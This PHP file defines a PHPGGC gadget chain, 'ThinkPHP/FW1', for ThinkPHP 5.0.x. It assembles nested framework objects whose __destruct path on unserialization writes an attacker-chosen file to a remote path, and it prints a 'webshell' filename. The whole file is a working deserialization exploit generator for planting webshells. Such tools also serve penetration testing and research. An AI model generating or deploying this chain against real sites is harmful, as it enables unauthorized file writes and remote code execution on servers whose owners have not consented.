<?php
/**
 * Created by PhpStorm.
 * User: wh1t3P1g
 * Date: 2018/8/24
 * Time: 13:38
 */

namespace GadgetChain\ThinkPHP;


class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public $version = '5.0.x';
    public $vector = '__destruct';
    public $author = 'wh1t3p1g';
    public $informations = '
    	This chain is supposed to write arbitrary remote file
    	see https://www.anquanke.com/post/id/196364
    	need short_open_tag off
    	./phpggc ThinkPHP/FW1 ./ evil.php -u
    ';

    public function generate(array $parameters)
    {
        $data = $parameters['data'];
        $remote_path = $parameters['remote_path'];
        $data = trim(str_rot13($data));
        echo "webshell文件名： ".urlencode($data)."3b58a9545013e88c7186db11bb158c44.php\n";
        $file_handler = new \think\cache\driver\File($remote_path,$data);
        $memcache = new \think\session\driver\Memcache($file_handler,"test.php");
        $output = new \think\console\Output($memcache);
        $query = new \think\db\Query($output);
        $relation = new \think\model\relation\HasOne(array("_wh1t3p1g"=>"test"),$query);
        $pivot = new \think\model\Pivot($output, $relation);
        return new \think\process\pipes\Windows($pivot);
    }
}